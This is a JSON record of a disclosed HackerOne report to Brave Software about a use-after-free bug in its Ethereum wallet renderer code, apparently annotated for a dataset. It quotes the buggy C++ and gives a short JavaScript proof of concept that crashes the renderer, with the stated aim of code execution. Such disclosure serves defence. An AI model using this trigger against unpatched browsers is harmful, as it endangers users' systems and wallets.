{
  "reported_to": "Brave Software",
  "reported_by": "nick0ve ",
  "title": "UAF on JSEthereumProvider",
  "content": "\nThere is a UAF (Use After Free) vulnerability in the renderer implementation of the Ethereum wallet.\nWhen the Ethereum wallet is connected, every V8 render gets this piece of code installed, creating a new object ethereum accessible from V8. You can find the code here: https://github.com/brave/brave-core/blob/45c6649a124dd8d0ffb19ca6f7047bebb6e6da2c/components/brave_wallet/renderer/js_ethereum_provider.cc#L163-L164\nI will highlight some parts of the JSEthereumProvider::Install function that show the bug:\nCode 1.47 KiB\n1// 1. Create a new handle to JSEthereumProvider and convert it to a v8::Object\n2gin::Handle<JSEthereumProvider> provider =\n3    gin::CreateHandle(isolate, new JSEthereumProvider(render_frame));\n4if (provider.IsEmpty()) {\n5  return;\n6}\n7v8::Local<v8::Value> provider_value = provider.ToV8();\n8v8::Local<v8::Object> provider_object =\n9    provider_value->ToObject(context).ToLocalChecked();\n10\n11// 2. Create a v8::Proxy for the provider\n12if (!v8::Proxy::New(context, provider_object, ethereum_proxy_handler_obj)\n13         .ToLocal(&ethereum_proxy)) {\n14  // Error handling\n15}\n16\n17// 3. Expose it through window.ethereum\n18global\n19    ->Set(context, gin::StringToSymbol(isolate, kEthereum), ethereum_proxy)\n20    .Check();\n21\n22// 4. Create a new v8::Object and make it accessible through ethereum._metamask\n23v8::Local<v8::Object> metamask_obj = v8::Object::New(isolate);\n24provider_object\n25    ->Set(context, gin::StringToSymbol(isolate, kMetaMask), metamask_obj)\n26    .Check();\n27\n28// 5. [BUG] Set a new property called `IsUnlocked`, creating a new callback object bound to `base::Unretained(provider.get())`, making the wrong assumption that ethereum._metamask can never outlive ethereum\n29provider_object\n30    ->Set(context, gin::StringToSymbol(isolate, kIsUnlocked),\n31          gin::CreateFunctionTemplate(\n32              isolate, base::BindRepeating(&JSEthereumProvider::IsUnlocked,\n33                                           base::Unretained(provider.get())))\n34              ->GetFunction(context)\n35              .ToLocalChecked())\n36    .Check();\nThe bug can be triggered through JavaScript with the following steps:\nGet a reference to ethereum._metamask.\nDelete the ethereum object, which deletes provider.get().\nCall isUnlocked(), which will point to the deleted provider.get() pointer.\nHere is a PoC (Proof of Concept) that can crash the renderer process:\nCode 198 Bytes\n1function triggerGC() {\n2  for (let i = 0; i < 100; i++) {\n3    let a = new Array(1000000);\n4  }\n5}\n6\n7let uafObj = ethereum._metamask;\n8delete ethereum;\n9triggerGC();\n10console.log(await uafObj.isUnlocked());\nWill try to follow up with a full exploit to show code execution on the renderer process.\nImpact\nGet code execution on the renderer process.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 3000,
  "weaknesses": [
    "Use After Free"
  ],
  "screenshots": {},
  "disclosed_date": 1697058120,
  "report_url": "https://hackerone.com/reports/1977252",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Get a reference to ethereum._metamask"
    ],
    [
      2,
      "Delete the ethereum object, which deletes provider.get()"
    ],
    [
      3,
      "Call isUnlocked(), which will point to the deleted provider.get() pointer"
    ]
  ],
  "vuln_description": "There is a UAF (Use After Free) vulnerability in the renderer implementation of the Ethereum wallet. When the Ethereum wallet is connected, every V8 render gets this piece of code installed, creating a new object ethereum accessible from V8. The bug occurs when a new property called `IsUnlocked` is set, creating a new callback object bound to `base::Unretained(provider.get())`, making the wrong assumption that ethereum._metamask can never outlive ethereum. This can be exploited to achieve code execution on the renderer process.",
  "reason": "This vulnerability involves understanding the interaction between V8's garbage collection, the lifetime of JavaScript objects, and the use of unretained pointers in callbacks. The attacker needs to manipulate the application state to trigger a use-after-free condition, which requires knowledge of both the JavaScript and C++ sides of the implementation.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}